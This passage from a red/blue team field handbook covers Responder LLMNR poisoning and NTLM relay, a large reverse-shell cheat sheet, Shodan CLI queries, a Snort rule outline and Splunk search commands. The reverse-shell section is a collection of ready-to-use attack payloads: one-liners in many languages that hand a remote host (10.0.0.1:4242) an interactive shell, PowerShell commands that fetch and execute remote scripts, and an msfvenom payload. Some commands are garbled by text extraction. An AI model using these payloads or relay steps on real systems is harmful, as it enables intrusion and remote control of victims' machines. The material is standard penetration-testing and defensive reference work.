X 
additional functionality of PCRE 
(PCRE extra) 
J 
allow duplicate names for 
subpatterns 
u 
unicode, pattern and subject 
strings are treated as UTF-8 
REFERENCE: 
https://github.com/niklongstone/regular-expression-cheat-sheet 
https://ihateregex.io/ 
R
R 
RESPONDER 
RED TEAM 
ESCALATE PRIV 
ALL 
Responder is an LLMNR, NBT-NS and MDNS poisoner and will answer to 
specific NBT-NS queries on the network based on their name suffix. 
268 
Responder listens on ports: UDP 53,137,138,389,1434 TCP 
21,25,80,110,139,389,445,587,1433,3128,3141 and Multicast UDP 5553. 
python Responder.py -I  
EXAMPLE HASHES 
(NTLMv1 SSP Enabled Hash Example) 
hashcat::admin-
5AA37877:85D5BC2CE95161CD00000000000000000000000000000000:892F905 
962F76D323837F613F88DE27C2BBD6C9ABCD021D0:1122334455667788 
(NTLMv1 No-SSP Hash Example) 
hashcat::admin-
5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E 
35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788 
(NTLMv2 Hash Example) 
admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6
:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e000000
0052920b85f78d013c31cdb3b92f5d765c783030 
Responder.conf – location for modifying various Responder 
configuration settings 
Target a specific IP address on the network and limit possible 
network disruptions edit: 
Responder.conf file value “RespondTo”  
Add the range 10.X.X.1-10 or host 10.X.X.2 you. 
Target a particular NBTS-NS/LLMNR name edit:  
Responder.conf file value “RespondToName” to a targeted spoof 
hostname e.g, SQLSERVER-01, FILESHARE02,… 
Use analyze mode ‘–A’ when trying to gauge how noisy the target IP 
space may be in order to watch requests: 
python Responder.py -I  -A 
MULTI-RELAY w/ RESPONDER 
STEP 1: Disable HTTP & SMB servers by editing the Responder.conf 
file. 
STEP 2: RunFinger.py to check if host has SMB Signing: False 
RunFinger.py is located in the tools directory. this script allows 
you to verify if SMB Signing: False. SMB Signing being disabled is 
crucial for this relay attack, otherwise the target for relaying 
isn’t vulnerable to this attack. 
python RunFinger.py –i 10.X.X.0/24 
269 
STEP 3: Start Responder.py 
python Responder.py –I  
STEP 4: Start Mult-Relay tool to route captured hashes to our 
Target IP. Caveat is that the user “-u” target must be a local 
administrator on the host.  
python MultiRelay.py –t  -u ALL 
**MacOS/ OSX Responder must be started with an IP address for the -
i flag (e.g. -i YOUR_IP_ADDR). There is no native support in OSX 
for custom interface binding. Using -i en1 will not work.  
Be sure to run the following commands as root to unload these 
possible running services and limit conflicts: 
launchctl unload 
/System/Library/LaunchDaemons/com.apple.Kerberos.kdc.plist 
launchctl unload 
/System/Library/LaunchDaemons/com.apple.mDNSResponder.plist 
launchctl unload /System/Library/LaunchDaemons/com.apple.smbd.plist 
launchctl unload 
/System/Library/LaunchDaemons/com.apple.netbiosd.plist 
REFERENCE: 
https://github.com/lgandx/Responder 
R
R 
REVERSE SHELLS 
RED TEAM 
C2 
WINDOWS/LINUX/MacOS 
Various methods to establish a reverse shell on target host. 
AWK 
awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf 
"shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) 
print $0 |& s; close(c); } } while(c != "exit") close(s); }}' 
/dev/null 
BASH TCP 
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1 
0/dev/tcp/10.0.0.1/4242; sh &196 2>&196 
BASH UDP 
Victim: 
sh -i >& /dev/udp/10.0.0.1/4242 0>&1 
Listener: 
270 
nc -u -lvp 4242 
SOCAT 
user@attack$ socat file:`tty`,raw,echo=0 TCP-L:4242 
user@victim$ /tmp/socat exec:'bash -
li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242 
user@victim$ wget -q https://github.com/andrew-d/static-
binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; 
chmod +x /tmp/socat; /tmp/socat exec:'bash -
li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242 
PERL 
perl -e 'use 
Socket;$i="10.0.0.1";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotob
yname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STD
IN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -
i");};' 
perl -MIO -e '$p=fork;exit,if($p);$c=new 
IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~-
>fdopen($c,w);system$_ while<>;' 
**Windows ONLY 
perl -MIO -e '$c=new 
IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~-
>fdopen($c,w);system$_ while<>;' 
PYTHON 
**Linux ONLY 
IPv4 
export RHOST="10.0.0.1";export RPORT=4242;python -c 'import 
sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),i
nt(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in 
(0,1,2)];pty.spawn("/bin/sh")' 
IPv4 
python -c 'import 
socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STR
EAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; 
pty.spawn("/bin/bash")' 
IPv6 
python -c 'import 
socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOC
271 
K_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));os.dup2(s.filen
o(),0); os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");' 
python -c 'import 
socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STR
EAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' 
**Windows ONLY 
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: 
[[[[[[[(s.connect(('10.0.0.1', 4242)), [[[(s2p_thread.start(), 
[[(p2s_thread.start(), (lambda __out: (lambda __ctx: 
[__ctx.__enter__(), __ctx.__exit__(None, None, None), 
__out[0](lambda: None)][2])(__contextlib.nested(type('except', (), 
{'__enter__': lambda self: None, '__exit__': lambda __self, 
__exctype, __value, __traceback: __exctype is not None and 
(issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in 
[((s.close(), lambda after: after())[1])]][0])})(), type('try', (), 
{'__enter__': lambda self: None, '__exit__': lambda __self, 
__exctype, __value, __traceback: [False for __out[0] in 
[((p.wait(), (lambda __after: 
__after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in 
[(True)]][0] for __g['p2s_thread'] in 
[(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for 
s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in 
[(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in 
[(subprocess.Popen(['\\windows\\system32\\cmd.exe'], 
stdout=subprocess.PIPE, stderr=subprocess.STDOUT, 
stdin=subprocess.PIPE))]][0])[1] for __g['s'] in 
[(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for 
__g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda 
__after: __y(lambda __this: lambda: 
(__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else 
__after())())(lambda: None) for __l['s'], __l['p'] in [(s, 
p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda 
s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: 
[(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] 
if (len(__l['data']) > 0) else __after())(lambda: __this()) for 
__l['data'] in [(__l['s'].recv(1024))]][0] if True else 
__after())())(lambda: None) for __l['s'], __l['p'] in [(s, 
p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, 
__g))]][0] for __g['socket'] in [(__import__('socket', __g, 
__g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, 
__g))]][0] for __g['threading'] in [(__import__('threading', __g, 
__g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: 
y(y)()))), globals(), __import__('contextlib'))" 
PHP 
272 
php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i &3 
2>&3");' 
php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -
i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);' 
RUBY 
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4242).to_i;exec 
sprintf("/bin/sh -i &%d 2>&%d",f,f,f)' 
ruby -rsocket -e 'exit if 
fork;c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen(
cmd,"r"){|io|c.print io.read}end' 
**Windows ONLY 
ruby -rsocket -e 
'c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen(cmd,
"r"){|io|c.print io.read}end' 
GOLANG 
echo 'package main;import"os/exec";import"net";func 
main(){c,_:=net.Dial("tcp","10.0.0.1:4242");cmd:=exec.Command("/bin
/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go 
&& go run /tmp/t.go && rm /tmp/t.go 
NETCAT Traditional 
nc -e /bin/sh 10.0.0.1 4242 
nc -e /bin/bash 10.0.0.1 4242 
nc -c bash 10.0.0.1 4242 
NETCAT OpenBsd 
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 
>/tmp/f 
NCAT 
ncat 10.0.0.1 4242 -e /bin/bash 
ncat --udp 10.0.0.1 4242 -e /bin/bash 
OPENSSL 
ATTACKER: 
user@attack$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -
out cert.pem -days 365 -nodes 
user@attack$ openssl s_server -quiet -key key.pem -cert cert.pem -
port 4242 
or 
user@attack$ ncat --ssl -vv -l -p 4242 
273 
VICTIM: 
user@victim$ mkfifo /tmp/s; /bin/sh -i &1 | openssl 
s_client -quiet -connect 10.0.0.1:4242 > /tmp/s; rm /tmp/s 
POWERSHELL 
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object 
System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = 
$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = 
$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object 
-TypeName System.Text.ASCIIEncoding).GetString($bytes,0, 
$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = 
$sendback + "PS " + (pwd).Path + "> ";$sendbyte = 
([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendby
te,0,$sendbyte.Length);$stream.Flush()};$client.Close() 
powershell -nop -c "$client = New-Object 
System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = 
$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = 
$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object 
-TypeName System.Text.ASCIIEncoding).GetString($bytes,0, 
$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = 
$sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = 
([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendby
te,0,$sendbyte.Length);$stream.Flush()};$client.Close()" 
powershell IEX (New-Object 
Net.WebClient).DownloadString('https://gist.githubusercontent.com/s
taaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50
895ecf9ab9dafe253ad4/mini-reverse.ps1') 
JAVA 
r = Runtime.getRuntime() 
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/4242;cat 
&5 >&5; done"] as String[]) 
p.waitFor() 
Java Alt1 
String host="127.0.0.1"; 
int port=4444; 
String cmd="cmd.exe"; 
Process p=new 
ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new 
Socket(host,port);InputStream 
pi=p.getInputStream(),pe=p.getErrorStream(), 
si=s.getInputStream();OutputStream 
po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){
while(pi.available()>0)so.write(pi.read());while(pe.available()>0)s
274 
o.write(pe.read());while(si.available()>0)po.write(si.read());so.fl
ush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch 
(Exception e){}};p.destroy();s.close(); 
Java Alternative 2 
Thread thread = new Thread(){ 
    public void run(){ 
        // Reverse shell here 
    } 
} 
thread.start(); 
WAR 
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f 
war > reverse.war 
strings reverse.war | grep jsp # in order to get the name of the 
file 
LUA 
**Linux ONLY 
lua -e 
"require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1
','4242');os.execute('/bin/sh -i &3 2>&3');" 
Windows & Linux 
lua5.1 -e 'local host, port = "10.0.0.1", 4242 local socket = 
require("socket") local tcp = socket.tcp() local io = require("io") 
tcp:connect(host, port); while true do local cmd, status, partial = 
tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") 
f:close() tcp:send(s) if status == "closed" then break end end 
tcp:close()' 
NodeJS 
(function(){ 
    var net = require("net"), 
        cp = require("child_process"), 
        sh = cp.spawn("/bin/sh", []); 
    var client = new net.Socket(); 
    client.connect(4242, "10.0.0.1", function(){ 
        client.pipe(sh.stdin); 
        sh.stdout.pipe(client); 
        sh.stderr.pipe(client); 
    }); 
    return /a/; // Prevents the Node.js application form crashing 
})(); 
or 
275 
require('child_process').exec('nc -e /bin/sh 10.0.0.1 4242') 
or 
-var x = global.process.mainModule.require 
-x('child_process').exec('nc 10.0.0.1 4242 -e /bin/bash') 
or 
https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py 
GROOVY 
String host="10.0.0.1"; 
int port=4242; 
String cmd="cmd.exe"; 
Process p=new 
ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new 
Socket(host,port);InputStream 
pi=p.getInputStream(),pe=p.getErrorStream(), 
si=s.getInputStream();OutputStream 
po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){
while(pi.available()>0)so.write(pi.read());while(pe.available()>0)s
o.write(pe.read());while(si.available()>0)po.write(si.read());so.fl
ush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch 
(Exception e){}};p.destroy();s.close(); 
Groovy Alt1 
Thread.start { 
    // Reverse shell here 
} 
SPAWN INTERPRETER TTY SHELL 
/bin/sh -i 
python3 -c 'import pty; pty.spawn("/bin/sh")' 
python3 -c "__import__('pty').spawn('/bin/bash')" 
python3 -c "__import__('subprocess').call(['/bin/bash'])" 
perl -e 'exec "/bin/sh";' 
perl: exec "/bin/sh"; 
perl -e 'print `/bin/bash`' 
ruby: exec "/bin/sh" 
lua: os.execute('/bin/sh') 
vi: :!bash 
vi: :set shell=/bin/bash:shell 
nmap: !sh 
mysql: ! bash 
INTERACTIVE REVERSE SHELL WINDOWS 
276 
**Pseudo Console (ConPty) in Windows ConPtyShell uses the function 
CreatePseudoConsole(). This function is available since Windows 10 
/ Windows Server 2019 version 1809 (build 10.0.17763). 
Server Side: 
stty raw -echo; (stty size; cat) | nc -lvnp 3001 
Client Side: 
IEX(IWR 
https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/In
voke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 
3001 
REFERENCE: 
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology
%20and%20Resources/Reverse%20Shell%20Cheatsheet.md 
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet 
https://highon.coffee/blog/reverse-shell-cheat-sheet/ 
S 
S
S 
SHODAN 
RED/BLUE TEAM 
RECON/ASSET DISCOV 
ALL 
SHODAN CLI 
To install Shodan CLI: 
# easy_install shodan 
Or upgrade existing Shodan Python library: 
# easy_install -U shodan 
277 
Once installed initialize the environment with your API key using 
shodan init: 
# shodan init YOUR_API_KEY 
*Get your API key from your Shodan account page 
Display Shodan query and scan credits available: 
# shodan info 
Show your external IP: 
# shodan myip 
Show information about an IP: 
# shodan host  
Show the count of results for a search: 
# shodan count  
# shodan count WebBox 
Show statistical information about a service: 
# shodan stats --facets   country: 
# shodan stats --facets http.component apache country:CN 
Search banner information for text string and display IP, port, 
organization, and hostnames: 
# shodan search --fields ip_str,port,org,hostnames  | tee 
search_results.txt 
Search a specific country banner information for text string and 
display IP, port, organization, and hostnames: 
# shodan search --fields ip_str,port,org,hostnames  
country:| tee search_results.txt 
Download lets you send JSON results into a file: 
# shodan download   
# shodan download Microsoft-data Microsoft iis 6.0 
Shodan network scanning request: 
# shodan scan submit --filename scan_results.txt  
Stream live Shodan scanning results: 
# shodan stream --datadir /dir/path/results 
# shodan stream --ports 80,443,3389 
Real-Time network alert streaming/monitoring: 
# shodan alert create “Scan results”  
Successful created network alert! 
278 
Alert ID: 6F2SCAZ6WV3CIAKE 
# shodan stream --alert= --datadir=scan-results/ 
Scan the entire internet *Enterprise license 
# shodan scan internet   
Query & display subdomains, records, IP, and ports 
# shodan domain example.com -D 
SHODAN WEB UI (shodan.io) 
Shodan IP address search: 
> 185.30.20.1 
> 185.30.20.1/24 
Shodan filter search results 'filter:value': 
> city:"Istanbul" port:23,3389 
**Filters: 
category = ics, malware, etc… ; category:ics 
city = city name; city:beijing 
country = country name; country:china 
hostname = find matching device hostname; server:”gws” 
hostname:”google” 
net = show results only in cidr range; net:185.30.20.0/24  
org = narrow based on organization; org:”AT&T” 
port = service port; port=23,22,3389 
product = service running; product=openssh 
geo = geo coordinates; geo:”56.7492,118.2640” 
os = operating system; os:”windows 10” 
before/after = devices in time range; apache after:21/01/2019 
before:14/02/2019 
Find websites that are clones by searching in the “Raw Data View” 
in a result & searching for the “data.0.http.html_hash” value. Then 
search for that value: 
> hash:-1604454775 
Raw Data Facets: https://beta.shodan.io/search/filters 
REFERENCE: 
https://cli.shodan.io/ 
https://beta.shodan.io/search/filters 
https://github.com/jakejarvis/awesome-shodan-queries/blob/master/readme.md 
S
S 
SNORT 
BLUE TEAM 
THREAT HUNT/DETECT 
ALL 
279 
Snort is an open-source, free and lightweight network intrusion 
detection system. 
BASIC SNORT RULE HEADER OUTLINE 
[action][protocol][sourceIP][sourcePORT]->[destIP][destPORT]([Rule Options]) 
EXAMPLE SNORT RULE 
RULE HEADER 
alert tcp $EXTERNAL_NET $HTTP_PORTS - > $HOME_NET any 
MESSAGE  
msg: "BROWSER-IE Microsoft Internet Explorer CacheSize 
exploit attempt"; 
FLOW 
flow: to_client,established; 
DETECTION 
file_data; 
content:"recordset"; offset:14; depth:9; 
content:".CacheSize"; distance:0; within:100; 
pcre:"/CacheSize\s*=\s*/"; 
byte_test:10,>,0x3ffffffe,0,relative,string; 
METADATA  
policy max-detect-ips drop, service http; 
REFERENCES 
reference:cve,2016-8077; 
CLASSIFICATION classtype: attempted-user; 
SIGNATUREid 
sid:65535;rev:1; 
REFERENCE: 
https://snort.org/documents 
https://snort-org-
site.s3.amazonaws.com/production/document_files/files/000/000/116/original/
Snort_rule_infographic.pdf 
S
S 
SPLUNK 
BLUE TEAM 
THREAT HUNT/DETECT 
ALL 
Splunk is a software platform to search, analyze and visualize the 
machine-generated data gathered from the websites, applications, 
sensors, devices etc. which make up IT infrastructure. 
ADD FIELDS 
Extract data from events 
into fields so that you can 
analyze and run reports on 
it in a meaningful way. 
* | extract reload=true 
Extract field/value pairs 
and reload field extraction 
settings from disk.  
* | extract pairdelim="|;", 
kvdelim="=:", auto=f 
Extract field/value pairs 
that are delimited by "|;", 
and values of fields that 
are delimited by "=:".  
* | multikv fields COMMAND filter 
splunkd 
Extract the COMMAND field 
when it occurs in rows that 
contain "splunkd".  
280 
* | xmlkv 
Automatically extracts 
fields from XML-formatted 
data. 
* | rex field=_raw "From: 
(?.*) To: (?.*)" 
Extract "from" and "to" 
fields using regular 
expressions. If a raw event 
contains "From: Susan To: 
Bob", then from=Susan and 
to=Bob.  
* | strcat sourceIP "/" destIP 
comboIP 
Add the field: comboIP. 
Values of comboIP = 
"sourceIP + "/" + destIP".  
 * | eval velocity=distance/time 
Add the field: velocity. 
Values of velocity = 
distance field value / time 
field value (using an SQLite 
evaluation).    
404 host=webserver1 | head 20 | 
iplocation  
Add location information 
(based on IP address) to the 
first twenty events that 
contain "404" and are from 
from webserver1. 
CONVERT FIELDS 
Change the names of fields, 
the units of values stored 
in fields,  the types of 
data stored in fields, or 
the attributes of fields. 
* | convert auto(*) none(foo)  
Convert every field value to 
a number value except for 
values in the field "foo" 
(use the {{none}} argument 
to specify fields to 
ignore). 
* | convert memk(virt) 
Change all memory values in 
the virt field to Kilobytes.  
* | convert dur2sec(delay) 
Change the sendmail syslog 
duration format (D+HH:MM:SS) 
to seconds. For example, if 
delay="00:10:15", the 
resulting value will be 
delay="615". 
* | convert rmunit(duration)}}  
Convert values of the 
duration field into number 
value by removing string 
values in the field value. 
For example,  if 
duration="212 sec", the 
resulting value will be 
duration="212". 
281 
* | rename _ip as IPAddress 
Rename the _ip field as 
IPAddress.  
* | replace *localhost with 
localhost in host 
Change any host value that 
ends with "localhost" to 
"localhost".  
FILTER AND ORDER FIELDS 
Filter and re-arrange how 
Splunk displays fields 
within search results. 
* | fields host, ip 
Keep only the host and ip 
fields, and display them in 
the order: host, ip.  
* | fields + host, ip 
Keep only the host and ip 
fields, and remove all 
internal fields (for 
example,  _time, _raw, etc.) 
that may cause problems in 
Splunk Web. 
* | fields - host, ip 
Remove the host and ip 
fields.  
FILTER RESULTS 
Filter search result sets by 
removing duplicate events, 
using regular expressions, 
or by searching within a 
result set.  
* | search src="10.9.165.*" OR 
dst="10.9.165.8" 
Keep only search results 
that have matching src or 
dst values.  
* | regex 
_raw=(?<!\d)10.\d{1,3}\.\d{1,3}\.\
d{1,3}(?!\d  
Keep only search results 
whose _raw field contains IP 
addresses in the non-
routable class A 
(10.0.0.0/8).  
* | dedup host 
Remove duplicates of results 
with the same host value.  